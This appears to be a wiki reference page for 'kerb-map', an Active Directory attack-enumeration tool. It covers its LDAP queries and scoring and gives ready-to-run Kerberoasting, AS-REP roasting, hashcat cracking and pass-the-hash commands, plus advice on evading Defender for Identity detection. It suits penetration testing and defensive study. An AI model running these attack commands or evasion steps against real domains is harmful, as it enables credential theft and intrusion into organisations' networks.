# Module Reference

> Deep dive into every kerb-map scan module — what it queries, how it scores findings, what the output means, and the exact exploitation commands that follow.

---

## Table of Contents

- [SPN Scanner](#spn-scanner)
- [AS-REP Scanner](#as-rep-scanner)
- [Delegation Mapper](#delegation-mapper)
- [User Enumerator](#user-enumerator)
- [CVE Scanner](#cve-scanner)
- [Scorer](#scorer)

---

## SPN Scanner

**Flag:** `--spn`

### What it does

The SPN scanner finds every non-computer, non-disabled, non-krbtgt domain account with a `servicePrincipalName` attribute set. These accounts are **Kerberoastable** — any authenticated domain user can request a TGS ticket for them and crack the ticket offline.

### LDAP Query

```
(&
  (servicePrincipalName=*)
  (!(objectClass=computer))
  (!(cn=krbtgt))
  (!(userAccountControl:1.2.840.113556.1.4.803:=2))
)
```

The `userAccountControl` bitflag `0x2` filters out disabled accounts — there is no value in targeting accounts that cannot authenticate.

### Attributes Collected

| Attribute | Purpose |
|---|---|
| `sAMAccountName` | Account name |
| `servicePrincipalName` | SPN list — reveals service type |
| `pwdLastSet` | Password age calculation |
| `lastLogonTimestamp` | Detects unmaintained accounts |
| `msDS-SupportedEncryptionTypes` | RC4 vs AES — critical for crack speed |
| `memberOf` | Group membership for admin detection |
| `userAccountControl` | Account flags |
| `adminCount` | Protected user indicator |
| `description` | Often contains plaintext credentials |

### Crack Score Algorithm

Each account receives a score from 0 to 100. Higher = faster/more valuable to Kerberoast.

```
Encryption type:
  RC4 allowed (enc=0 or bit 2 set)   → +40 pts
  Unknown/default enc type            → +20 pts

Password age:
  Never set                           → +15 pts
  Older than 2 years (730 days)       → +25 pts
  Older than 1 year (365 days)        → +15 pts
  Older than 6 months (180 days)      → +5 pts

Admin membership:
  adminCount=1 or admin group member  → +20 pts

Service type bonus (highest SPN type):
  MSSQLSvc, exchangeMDB               → +30-35 pts
  WSMAN, CIFS                         → +20-25 pts
  HTTP, LDAP, TERMSRV                 → +15-20 pts

Account history:
  Never logged in                     → +10 pts
```

### Reading the Output

```
Kerberoastable Accounts
Account       SPN Types    Pwd Age   RC4   Admin  Score  Description
svc_sql       MSSQLSvc     847d      YES   NO     85     SQL Service Account
backup_svc    wbem/cifs    365d      YES   YES    80     Backup administrator
svc_exchange  exchangeMDB  120d      NO    NO     35
```

- **RC4 YES** — request RC4 tickets (`-m 13100` in hashcat, cracks orders of magnitude faster than AES)
- **Admin YES** — cracking this hash gives immediate high-privilege access
- **Pwd Age 847d** — password set 847 days ago, likely weak or unchanged since provisioning
- **Description** — always read this; administrators frequently leave plaintext passwords in description fields

### Exploitation

```bash
# kerb-map identifies svc_sql as top priority
# Run the pre-filled command from the output:

GetUserSPNs.py corp.local/jsmith:Password123 \
    -request-user svc_sql \
    -outputfile svc_sql.hash

# Crack RC4 hash
hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# With GPU (much faster)
hashcat -m 13100 -d 1 svc_sql.hash /usr/share/wordlists/rockyou.txt

# If AES only (quieter but slower)
GetUserSPNs.py corp.local/jsmith:Password123 \
    -request-user svc_sql \
    -enc-type aes256 \
    -outputfile svc_sql_aes.hash
hashcat -m 19700 svc_sql_aes.hash /usr/share/wordlists/rockyou.txt
```

### Detection

| Event | ID | Description |
|---|---|---|
| TGS request | 4769 | Generated per ticket request on the DC |
| RC4 ticket | 4769 (enc 0x17) | Requesting RC4 when AES available = immediate MDI alert |

> **Evasion:** Request AES tickets. Space out requests. One request per minute looks nothing like automated Kerberoasting.

---

## AS-REP Scanner

**Flag:** `--asrep`

### What it does

Finds all enabled domain accounts with the `DONT_REQ_PREAUTH` flag (`0x400000`) set in `userAccountControl`. These accounts **do not require Kerberos pre-authentication**, meaning anyone can request an AS-REP for them without credentials. The AS-REP contains a blob encrypted with the user's password hash — crackable offline.

### Why This Exists

Pre-authentication is a security addition to Kerberos that prevents offline password cracking of the AS-REP. When disabled (usually for legacy application compatibility or accidental misconfiguration), it exposes the account to this attack.

### LDAP Query

```
(&
  (userAccountControl:1.2.840.113556.1.4.803:=4194304)
  (!(userAccountControl:1.2.840.113556.1.4.803:=2))
)
```

### Scoring

AS-REP accounts receive flat scores:
- **75** — standard account
- **90** — account is a member of an admin group (cracking immediately yields elevated access)

The score is flat because this attack requires **zero credentials** — the opportunity cost of attempting it is near zero regardless of the account.

### Exploitation

```bash
# With credentials (kerb-map found these for you)
GetNPUsers.py corp.local/jsmith:Password123 \
    -no-pass \
    -usersfile asrep_users.txt \
    -format hashcat \
    -outputfile asrep.hashes

# Without any credentials (just valid usernames)
GetNPUsers.py corp.local/ \
    -no-pass \
    -usersfile users.txt \
    -format hashcat \
    -outputfile asrep.hashes

# Crack AS-REP hash (mode 18200)
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

### Detection

Event ID **4768** is generated for every AS-REQ, but without pre-auth the timestamp cannot be validated. Modern MDI detects bulk AS-REP requests from non-DC sources.

---

## Delegation Mapper

**Flag:** `--delegation`

### What it does

Maps all three Kerberos delegation types across the domain. Delegation misconfigurations are consistently among the highest-value findings in enterprise AD assessments.

### Type 1 — Unconstrained Delegation

**LDAP filter:**
```
(&
  (userAccountControl:1.2.840.113556.1.4.803:=524288)
  (!(primaryGroupID=516))
  (!(primaryGroupID=521))
)
```

The bit `0x80000` (524288) in `userAccountControl` is `TRUSTED_FOR_DELEGATION`. Domain Controllers (primaryGroupID=516) and RODCs (521) are excluded because they legitimately have this flag.

**What to look for:**
- Computer accounts with unconstrained delegation that are **not DCs** — these are the attack targets
- User accounts with unconstrained delegation — extremely rare, almost always a misconfiguration

**Risk:** CRITICAL. Any user who authenticates to this host caches their TGT there. Combine with printerbug or PetitPotam to coerce DC authentication and extract the DC's TGT.

### Type 2 — Constrained Delegation

**LDAP filter:**
```
(msDS-AllowedToDelegateTo=*)
```

Additionally checks `userAccountControl` bit `0x1000000` (TRUSTED_TO_AUTH_FOR_DELEGATION) which enables protocol transition (S4U2Self).

**With Protocol Transition (HIGH risk):** The account can impersonate any user to the listed services without that user ever authenticating first.

**Without Protocol Transition (MEDIUM risk):** Only users who actually authenticate can be delegated — still useful but requires a real authentication event.

### Type 3 — Resource-Based Constrained Delegation (RBCD)

**LDAP filter:**
```
(msDS-AllowedToActOnBehalfOfOtherIdentity=*)
```

This attribute lives on the **target** object. If it's set, someone has already configured RBCD pointing to this computer. The question is: do you control the source account in the RBCD relationship?

If you have `GenericWrite` over a computer object (identified by BloodHound), you can **write** this attribute yourself to create a new RBCD relationship.

### Output Interpretation

```
Unconstrained Delegation (2 hosts):
  WEBSERVER01$  [computer]  webserver01.corp.local
  APPSERVER02$  [computer]  appserver02.corp.local

Constrained Delegation (1 account):
  svc_iis  (S4U2Self ENABLED)
  → cifs/fileserver.corp.local
  → http/intranet.corp.local

RBCD Configured (1 target):
  WORKSTATION15$  workstation15.corp.local
  (check who has GenericWrite over this object)
```

---

## User Enumerator

**Flag:** `--users`

### What it does

Performs broad passive enumeration of users, policies, and domain configuration. All queries are read-only LDAP. Generates no Kerberos traffic, no RPC connections.

### Sub-checks

#### Privileged Users (adminCount=1)

```
LDAP filter: (&(objectClass=user)(adminCount=1)(!(userAccountControl:...disabled)))
```

`adminCount=1` means the account was **at some point** added to a protected group (Domain Admins, Backup Operators, etc.). This flag is set by SDProp but is **never automatically removed**. This is how you find "shadow admins" — accounts that were in a privileged group, were removed, but still retain elevated ACLs due to SDProp.

For each privileged user, kerb-map checks:
- `PASSWORD_NEVER_EXPIRES` flag — high-value target (password may be old and weak)
- Group membership — which protected groups they belong to

#### Stale Accounts

Accounts with `lastLogonTimestamp` before approximately 2020. These are often forgotten, unmaintained service accounts or former employee accounts with weak or default passwords.

```
Threshold: Windows FILETIME 132000000000000000 (~2019-11-18)
```

#### Password Policy

Reads domain password policy and flags weaknesses:

| Check | Risk |
|---|---|
| `minPwdLength < 8` | Weak passwords permitted |
| `lockoutThreshold = 0` | Password spraying unrestricted |
| Complexity disabled | Dictionary attacks more effective |
| Reversible encryption | Plaintext password recovery possible |
| Passwords never expire | Likely stale, weak passwords |

**No lockout policy** is a CRITICAL finding. kerb-map adds an immediate password spray entry to the priority table when this is detected.

#### DnsAdmins

Members of the DnsAdmins group can configure the DNS service to load an arbitrary DLL from a UNC path. Since DNS runs as SYSTEM on Domain Controllers, this is a direct privilege escalation path.

kerb-map resolves each member DN to a `sAMAccountName` for the output.

#### Domain Trusts

Reads all `trustedDomain` objects and checks:

| Check | Risk |
|---|---|
| SID filtering disabled (`trustAttributes & 0x40 = 0`) | HIGH — SID history injection across trust |
| Bidirectional trust | Lateral movement between domains |
| Forest trust | Wider impact radius |

**SID filtering disabled** means an attacker with DA in one domain can craft a TGT with SID history entries from the trusted domain, gaining access to resources in the trusted domain.

#### LAPS Status

Queries for the presence of `ms-Mcs-AdmPwd` on any computer object. If LAPS is not deployed, all workstations likely share the same local Administrator password — a single credential compromise becomes lateral movement everywhere.

```
LAPS not detected → all machines may share local admin password
→ Immediately try local admin hash against all hosts:
nxc smb 192.168.1.0/24 -u Administrator -H <LOCAL_ADMIN_HASH> --local-auth
```

---

## CVE Scanner

**Flag:** `--cves`
**Aggressive RPC probes:** `--aggressive`

See the dedicated [CVE Detection](CVE-Detection) wiki page for full per-CVE documentation including detection methods, exploitation steps, and remediation.

### Quick Reference

| CVE | Name | Method | Aggressive? |
|---|---|---|---|
| CVE-2021-42278/42287 | noPac | LDAP only | No |
| ESC1-ESC8 | AD CS | LDAP only | No |
| CVE-2014-6324 | MS14-068 | LDAP indicator | No |
| CVE-2020-1472 | ZeroLogon | Netlogon RPC | Yes |
| CVE-2021-34527 | PrintNightmare | RPC \pipe\spoolss | Yes |
| CVE-2021-36942 | PetitPotam | RPC LSARPC | Yes |

---

## Scorer

**Runs automatically after all modules complete.**

### What it does

The scorer is the layer that makes kerb-map operationally useful rather than just a data dump. It takes all module output, assigns priority scores to each finding, cross-correlates them, and produces a unified ranked attack path list.

### Scoring Table

| Finding | Base Score | Adjustments |
|---|---|---|
| CVE — CRITICAL | 98 | None |
| Unconstrained Delegation | 95 | None — always critical |
| Password spray (no lockout) | 85 | None |
| DnsAdmins member | 88 | None |
| CVE — HIGH | 85 | None |
| AS-REP + admin group | 90 | +15 for admin membership |
| AS-REP standard | 75 | Base |
| SPN Kerberoast | 0–100 | Dynamic (see SPN Scanner) |
| Constrained Deleg S4U2Self | 80 | Protocol transition required |
| RBCD | 70 | Base |
| Trust abuse (SID filtering off) | 75 | Base |

### Priority Table Output

```
⚡ Priority Attack Paths

#  Target          Attack                    Sev       Score  Reason                         Next Step
1  WEBSERVER01$    Unconstrained Deleg       CRITICAL  95     Any auth user hands over TGT   python printerbug.py corp.local/user...
2  svc_sql         Kerberoast                CRITICAL  85     RC4 allowed | password 847d    GetUserSPNs.py ... -request-user svc_sql
3  helpdesk01      AS-REP Roast              HIGH      75     Pre-auth disabled              GetNPUsers.py ... -no-pass
4  Domain Ctrlr    noPac (CVE-2021-42278)    CRITICAL  98     MachineAccountQuota=10         python noPac.py corp.local/...
```

### Next Step Generation

The scorer fills in account names and domain details in pre-formatted commands so you can copy-paste directly into your terminal. It uses the actual account names discovered during enumeration, not placeholders.

### Deduplication

Findings are deduplicated by `(target, attack)` key — if both the delegation mapper and the CVE scanner flag the same issue from different angles, only one entry appears in the output.
